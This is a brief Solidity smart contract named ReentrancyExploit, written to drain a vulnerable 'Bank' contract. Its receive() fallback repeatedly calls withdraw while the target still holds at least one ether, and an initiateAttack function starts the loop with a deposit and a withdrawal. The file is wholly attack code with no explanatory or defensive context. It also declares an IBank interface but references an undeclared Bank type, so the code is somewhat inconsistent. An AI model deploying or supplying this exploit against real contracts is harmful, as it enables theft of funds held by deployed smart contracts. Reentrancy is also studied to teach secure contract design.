interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyExploit {
    Bank public bankContract;
    address public exploiter;

    constructor(address _bankContract) {
        bankContract = Bank(_bankContract);
        exploiter = msg.sender;
    }

    receive() external payable {
        if (address(bankContract).balance >= 1 ether) {
            bankContract.withdraw(1 ether);
        }
    }

    function initiateAttack() external payable {
        require(msg.value >= 1 ether);
        bankContract.deposit{value: 1 ether}();
        bankContract.withdraw(1 ether);
    }

}